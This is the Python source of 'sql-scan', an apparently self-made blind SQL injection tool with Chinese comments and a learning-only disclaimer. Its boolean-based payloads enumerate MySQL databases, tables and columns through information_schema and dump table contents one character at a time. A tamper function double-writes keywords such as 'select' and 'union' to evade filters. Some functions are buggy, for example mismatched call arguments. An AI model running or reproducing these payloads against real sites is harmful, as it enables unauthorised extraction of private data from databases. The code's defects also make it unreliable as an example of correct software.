#!/usr/bin/env python3

import requests
import sys
import argparse
import re
import time
from bs4 import BeautifulSoup
import threading
import urllib.parse

Version = "sql-scan Tool V1.0.0"
Title = '''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo = f'''
                Github==>https://github.com/interstin/sql-scan 
                {Version}  '''

#响应页面关键词
message="Logon failure"

#要搜索的数据
s_data="hello"

#ascii码值范围
low = 32
high = 128

#设置网络超时时间,单位为秒
timeout=50

#爆破数据库的数量
database_num="admin\" and (select count(schema_name) from information_schema.schemata where schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')) = {}#"

#爆破库名ascii码值的payload
database_size="admin\" and ascii(substr((select schema_name from information_schema.schemata where schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') limit {},1),{},1)) = {} #"

#爆破表得个数
num_table="admin\" and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='{}') = {}#"

#爆破表的长度的payload
len_table="admin\" and (select length(table_name) from information_schema.tables where table_schema='{}' limit {},1)={}#"

#爆破表名的ascii码值的payload
table_size="admin\" and ascii(substr((select table_name from information_schema.tables where table_schema = '{}' limit {},1),{},1))={}#"

#爆破列的数量
num_column="admin\" and (select count(column_name) from information_schema.columnS where table_name='{}') = {}#"

#爆破列的长度
len_column="admin\" and (select length(column_name) from information_schema.columnS where table_name='{}' limit {},1) = {}#"

#爆破列名
column_size="admin\" and ascii(substr((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1)) = {}#"

#爆破表中的数据数量
num_data="admin\" and (select count(concat({})) from {})={}#"

#爆破表中数据的长度
len_data="admin\" and (select length({}) from {} limit {},1)={}#"

#爆破表中的数据
size_data="admin\" and ascii(substr((select {} from {} limit {},1),{},1))={}#"


#get请求
def get(url,payload,bypass):
    if bypass == tamper:
        payload = tamper(payload)
    payload_temp= urllib.parse.quote(payload)
    url=url.replace("*",payload_temp)
    result = requests.get(url,timeout=timeout).text
    #print("你访问的url为：",url,"\t访问方式为get")
    return result

#post请求
def post(url,payload,data,bypass):
    if bypass == tamper:
        payload= tamper(payload)
    data = data.replace('*',payload)
    data=urllib.parse.quote(data)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    result = requests.post(url,data=data,headers=headers,timeout=timeout).text
    #print("你访问的url为：",url,"\t访问方式为post")
    return result

#双写绕过脚本
def tamper(payload):
    payload= re.sub(' ' , '/**/',payload,flags=re.IGNORECASE)
    payload= re.sub('or' , 'oorr',payload,flags=re.IGNORECASE)
    payload= re.sub('by' , 'bbyy',payload,flags=re.IGNORECASE)
    payload= re.sub('if' , 'iiff',payload,flags=re.IGNORECASE)
    payload= re.sub('and' , 'anandd',payload,flags=re.IGNORECASE)
    payload= re.sub('mid' , 'mimidd',payload,flags=re.IGNORECASE)
    payload= re.sub('char' , 'chcharar',payload,flags=re.IGNORECASE)
    payload= re.sub('from' , 'frfromom',payload,flags=re.IGNORECASE)
    payload= re.sub('union' , 'uniunionon',payload,flags=re.IGNORECASE)
    payload= re.sub('sleep' , 'slesleepep',payload,flags=re.IGNORECASE)
    payload= re.sub('where' , 'whewherere',payload,flags=re.IGNORECASE)
    payload= re.sub('ascii' , 'ascasciiii',payload,flags=re.IGNORECASE)
    payload= re.sub('select' , 'selselectect',payload,flags=re.IGNORECASE)
    payload= re.sub('substr' , 'subsubstrstr',payload,flags=re.IGNORECASE)
    retVal=payload
    return retVal



#搜索对应数据
def search_data(data):
    soup = BeautifulSoup(data, 'html.parser')
    p_data = soup.find_all('p')
    for data in p_data:
        match = re.search(s_data,data.get_text())
        if match:
            return data.get_text()[:match.start()]
        
#检查是否存在注入
def check_sql(url,method,data,payload):
    if method =='get':
        result = get(url,payload)
    elif method =='post':
        result = post(url,data,payload)

#爆破数据库的数量
def fuzz_D_num(url,method,data,bypass):
    if data==None:
        data =''
    if method =='get':
        for num in range(1,20):
            payload = database_num.format(num)
            result = get(url,payload,bypass)
            if message in result:
                return num
    elif method =='post':
        for num in range(1,20):
            payload = database_num.format(num)
            result = post(url,payload,data,bypass)
            if message not in result:
                return num


#爆破数据库长度
def fuzz_D_len(url,method,data,num_database,bypass):
    database_Len_result={}
    with open('len.txt','r') as file:
        for payload in file:
            if data==None:
                data =''
            if method =='get':
                #猜数据库长度
                for num in range(0,num_database):
                    for len in range (1,21):
                        payload_temp = payload.format(num,len)
                        #payload = (payload.replace("*",str(len)))
                        result = get(url,payload_temp,bypass)
                        if message not in result:
                            #print(result)
                            #print("第{}数据库的长度为：{}".format((num+1),len))
                            database_Len_result[num] = len 
                            #payload = payload.replace(str(len),"*")
                            break
                        #payload = payload.replace(str(len),"*")
                return database_Len_result
            elif method =='post':
                #猜数据库长度
                for num in range(0,num_database):
                    for len in range (1,21):
                        payload_temp = payload.format(num,len)
                        #payload = (payload.replace("*",str(len)))
                        result = post(url,payload_temp,data,bypass)
                        if message not in result:
                            #print(result)
                            #print("第{}数据库的长度为：{}".format((num+1),len))
                            database_Len_result[num] = len 
                            #payload = payload.replace(str(len),"*")
                            break
                        #payload = payload.replace(str(len),"*")
                return database_Len_result

#爆破数据库的ascii码值
def fuzz_D_size(url,method,data,num_D,len,bypass):
    if data==None:
        data =''
    if method =='get':
        for num in range(0,num_D):
            time = 1
            print("第{}个数据库名为:".format(num+1),end='')
            while time <= len[num]:
                #payload = payload.replace("len",str(time))
                for i in range (low,high+1):
                    #payload = payload.replace("size",str(mid))
                    payload = database_size.format(num,time,i)
                    result = get(url,payload,bypass)
                    if message in result:
                        print(chr(i),end='')
                        break
                #payload = payload.replace(str(time),"len")
                time += 1
            print("")
    elif method =='post':
        for num in range(0,num_D):
            time = 1
            print("第{}个数据库名为:".format(num+1),end='')
            while time <= len[num]:
                #payload = payload.replace("len",str(time))
                for i in range (low,high+1):
                    #payload = payload.replace("size",str(mid))
                    payload = database_size.format(num,time,i)
                    result = post(url,payload,data,bypass)
                    if message in result:
                        print(chr(i),end='')
                        break
                #payload = payload.replace(str(time),"len")
                time += 1
            print("")

#爆破表的数量
def fuzz_T_num(url,method,data,database_name,bypass):
    if data==None:
        data =''
    if method =='get':
        #猜表数量
        for num in range(0,50):
            payload=num_table.format(database_name,num)
            result = result = get(url,payload,bypass)
            if message in result:
                print("表的数量为："+str(num))
                return num
    elif method =='post':
        #猜表数量
        for num in range(0,50):
            payload=num_table.format(database_name,num)
            result = post(url,payload,data,bypass)
            if message not in result:
                print("表的数量为："+str(num))
                return num


#爆破表的长度
def fuzz_T_len(url,method,data,num,database_name,bypass):
    if data==None:
        data =''
    if method =='get':
        #猜表长度
        Length={}
        for n in range(1,num+1):
            for len in range(1,20):
                payload=len_table.format(database_name,(n-1),len)
                result = get(url,payload,bypass)
                if message in result:
                    #print("第{}个表的长度为：".format(n)+str(len))
                    Length[n-1]=len
                    break
        return Length
    elif method =='post':
        #猜表长度
        Length={}
        for n in range(1,num+1):
            for len in range(1,20):
                payload=len_table.format(database_name,(n-1),len)
                result = post(url,payload,data,bypass)
                if message not in result:
                    #print("第{}个表的长度为：".format(n)+str(len))
                    Length[n-1]=len
                    break
        return Length
            
#爆破表名
def fuzz_T_size(url,len_T,method,data,num,database_name,bypass):
    if data==None:
        data =''
    time = 1
    if method =='get':
        for n in range(1,num+1):
            print("第{}个表名为:".format(n),end='')
            while time <= len_T[n-1]:
                #payload = payload.replace("len",str(time))
                for i in range (low,high):
                    #payload = payload.replace("size",str(mid))
                    payload = table_size.format(database_name,(n-1),time,i)
                    result = get(url,payload,bypass)
                    if message in result:
                        print(chr(i),end='')
                        break
                #payload = payload.replace(str(time),"len")
                time += 1
            print("\n")
            time = 1
    elif method =='post':
        for n in range(1,num+1):
            print("第{}个表名为:".format(n),end='')
            while time <= len_T[n-1]:
                #payload = payload.replace("len",str(time))
                for i in range (low,high):
                    #payload = payload.replace("size",str(mid))
                    payload = table_size.format(database_name,(n-1),time,i)
                    result = post(url,payload,data,bypass)
                    if message not in result:
                        print(chr(i),end='')
                        break
                #payload = payload.replace(str(time),"len")
                time += 1
            print("\n")

#爆破列的数量
def fuzz_C_num(url,method,data,table_name,bypass):
    if data==None:
        data =''
    if method =='get':
        #猜列数量
        for num in range(1,20):
            payload=num_column.format(table_name,num)
            result = get(url,payload,bypass)
            if message in result:
                print("{}表的列数为：".format(table_name)+str(num))
                return num
    elif method =='post':
        #猜列数量
        for num in range(1,20):
            payload=num_column.format(table_name,num)
            result = post(url,payload,data,bypass)
            if message not in result:
                print("{}表的列数为：".format(table_name)+str(num))
                return num

#爆破列名长度
def fuzz_C_len(url,method,data,table_name,column_num,bypass):
    if data==None:
        data =''
    if method =='get':
        #猜表长度
        Length={}
        for n in range(1,column_num+1):
            for len in range(1,20):
                payload=len_column.format(table_name,(n-1),len)
                result = get(url,payload,bypass)
                if message in result:
                    #print("第{}个表的长度为：".format(n)+str(len))
                    Length[n-1]=len
                    break
        return Length
    elif method =='post':
        #猜表长度
        Length={}
        for n in range(1,column_num+1):
            for len in range(1,20):
                payload=len_column.format(table_name,(n-1),len)
                result = post(url,payload,data,bypass)
                if message not in result:
                    #print("第{}个表的长度为：".format(n)+str(len))
                    Length[n-1]=len
                    break
        return Length
    
#爆破列名
def fuzz_C_size(url,method,data,table_name,column_num,len_C,bypass):
    if data==None:
        data =''
    if method =='get':
        for n in range(1,column_num+1):
            time = 1
            print("第{}列名为:".format(n),end='')
            while time <= len_C[n-1]:
                #payload = payload.replace("len",str(time))
                for i in range(low,high+1):
                    #payload = payload.replace("size",str(mid))
                    payload = column_size.format(table_name,(n-1),time,i)
                    result = get(url,payload,bypass)
                    if message in result:
                        print(chr(i),end='')
                        break
                    #payload = payload.replace(str(mid),"size")
                #payload = payload.replace(str(time),"len")
                time += 1
            print("")
    elif method =='post':
        for n in range(1,column_num+1):
            time = 1
            print("第{}列名为:".format(n),end='')
            while time <= len_C[n-1]:
                #payload = payload.replace("len",str(time))
                for i in range(low,high+1):
                    #payload = payload.replace("size",str(mid))
                    payload = column_size.format(table_name,(n-1),time,i)
                    result = post(url,payload,data,bypass)
                    if message not in result:
                        print(chr(i),end='')
                        break
                    #payload = payload.replace(str(mid),"size")
                #payload = payload.replace(str(time),"len")
                time += 1
            print("")

#爆破表中的数据数量
def fuzz_num_data(url,method,data,column_name,table_name,bypass):
    if data==None:
        data =''
    if method =='get':
        for i in range (1,55):
            payload = num_data.format(column_name,table_name,i)
            result = get(url,payload,bypass)
            if message in result:
                print("{}表中有{}个{}".format(table_name,i,column_name))
                return i
    elif method =='post':
        for i in range (1,55):
            payload = num_data.format(column_name,table_name,i)
            result = post(url,payload,data,bypass)
            if message not in result:
                print("{}表中有{}个{}".format(table_name,i,column_name))
                return i

#爆破表中的数据长度
def fuzz_len_data(url,method,data,column_name,table_name,data_num,bypass):
    if data==None:
        data =''
    num_data_len={}
    if method =='get':
        for len in range (1,data_num+1):
            for i in range (1,55):
                payload = len_data.format(column_name,table_name,(len-1),i)
                result = get(url,payload,bypass)
                if message in result:
                    #print("{}表中{}列第{}行的长度为{}".format(table_name,column_name,len,i))
                    num_data_len[len-1]=i
                    break
        return num_data_len
    elif method =='post':
        for len in range (1,data_num+1):
            for i in range (1,55):
                payload = len_data.format(column_name,table_name,(len-1),i)
                result = post(url,payload,data,bypass)
                if message not in result:
                    #print("{}表中{}列第{}行的长度为{}".format(table_name,column_name,len,i))
                    num_data_len[len-1]=i
                    break
        return num_data_len
                
#爆破表中的数据
def fuzz_size_data(url,method,data,column_name,table_name,data_num,data_len,bypass):
    if data==None:
        data =''
    if method =='get':
        for n in range(1,data_num+1):
            time = 1
            print("{}表第{}列数据为:".format(table_name,n),end='')
            while time <= data_len[n-1]:
                #payload = payload.replace("len",str(time))
                for i in range(low,high+1):
                    #payload = payload.replace("size",str(mid))
                    payload = size_data.format(column_name,table_name,(n-1),time,i)
                    result = get(url,payload,bypass)
                    if message in result:
                        print(chr(i),end='')
                        break
                    #payload = payload.replace(str(mid),"size")
                #payload = payload.replace(str(time),"len")
                time += 1
            print("")
    elif method =='post':
        for n in range(1,data_num+1):
            time = 1
            print("{}表第{}列数据为:".format(table_name,n),end='')
            while time <= data_len[n-1]:
                #payload = payload.replace("len",str(time))
                for i in range(low,high+1):
                    #payload = payload.replace("size",str(mid))
                    payload = size_data.format(column_name,table_name,(n-1),time,i)
                    result = post(url,payload,data,bypass)
                    if message not in result:
                        print(chr(i),end='')
                        break
                    #payload = payload.replace(str(mid),"size")
                #payload = payload.replace(str(time),"len")
                time += 1
            print("")
        

def scan(url,method,data,database_name,databases,table_name,tables,column_name,columns,dump,bypass):
    if databases:
        #爆破数据库的数量
        num_database = fuzz_D_num(url,method,data,bypass)
        print("查询到{}个数据库".format(num_database))
        #爆破数据库长度
        len_D = {}
        len_D = fuzz_D_len(url,method,data,num_database,bypass)
        for i in len_D:
            print("第{}个数据库的长度为：{}".format(i+1,len_D[i]))
        #爆破数据库名
        fuzz_D_size(url,method,data,num_database,len_D,bypass)
        return
    if tables:
        if database_name==None:
            print("请-D指定要查询的数据名")
            return
        #爆破表的数量
        num = fuzz_T_num(url,method,data,database_name,bypass)
        #爆破表的长度
        len_T={}
        len_T = fuzz_T_len(url,method,data,num,database_name,bypass)
        for i in len_T:
            print("第%i个表的长度为：" % (i+1) + str(len_T[i]))
        #爆破表的值
        fuzz_T_size(url,len_T,method,data,num,database_name,bypass)
        return
    if columns:
        if database_name==None:
            print("请-D指定要查询的数据名")
            return
        if table_name==None:
            print("请-T指定要查询的表名")
            return
        #爆破列的数量
        column_num = fuzz_C_num(url,method,data,table_name,bypass)
        #爆破列的长度
        len_C={}
        len_C = fuzz_C_len(url,method,data,table_name,column_num,bypass)
        for i in len_C:
            print("第%i列的长度为：" % (i+1) + str(len_C[i]))
        #爆破列名
        fuzz_C_size(url,method,data,table_name,column_num,len_C,bypass)
        return
    if dump:
        if database_name==None:
            print("请-D指定要查询的数据名")
            return
        if table_name==None:
            print("请-T指定要查询的表名")
            return
        if column_name==None:
            print("请-C指定要查询的列名")
            return
        #爆破表中数据数量
        data_num =fuzz_num_data(url,method,data,column_name,table_name,bypass)
        #爆破表中数据的长度
        data_len={}
        data_len = fuzz_len_data(url,method,data,column_name,table_name,data_num,bypass)
        for l in data_len:
            print("{}表中{}列第{}行的长度为{}".format(table_name,column_name,(l+1),str(data_len[l])))
        #爆破表中的数据
        fuzz_size_data(url,method,data,column_name,table_name,data_num,data_len,bypass)
        return
            #判断是否存在注入
            #check_sql(url,method,data,payload)
            #搜索数据
            #result = search_data(result)
            #print(result)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-U", "--url",required=True, help="URL to scan")
    parser.add_argument("-M","--method",default='get',help="get or post or others method,default is get")
    parser.add_argument("--data",help="the data that you want to post，you want check palces use * replace")
    parser.add_argument("-D","--database",help="the data that you select database")
    parser.add_argument("--dbs",action="store_true",help="dump the databases")
    parser.add_argument("-T","--table",help="the data that you select table")
    parser.add_argument("--tables",action="store_true",help="dump the tables")
    parser.add_argument("-C","--column",help="the data that you select column")
    parser.add_argument("--columns",action="store_true",help="dump the columns")
    parser.add_argument("--dump",action="store_true",help="dump the data")
    parser.add_argument("--bypass",action="store_true",help="bypass")
    parser.add_argument("--threads", type=int, default=1, help="number of threads to use")

    args = parser.parse_args()

    if args.url==None:
        print("请指定你要访问的地址:\n如test.py -u http://xxxxx") 
    elif not re.search(r"(?i)\Ahttp[s]*://", args.url):
        args.url = "http://%s" % args.url 
    #print("你访问的url为：",args.url)
    
    scan(args.url,args.method,args.data,args.database,args.dbs,args.table,args.tables,args.column,args.columns,args.dump,args.bypass)

if __name__=='__main__':
    start_time = time.time()
    print(Logo,'\n')
    main()
    end_time = time.time()
    run_time = end_time - start_time
    print("\n运行时间为："+str(run_time))
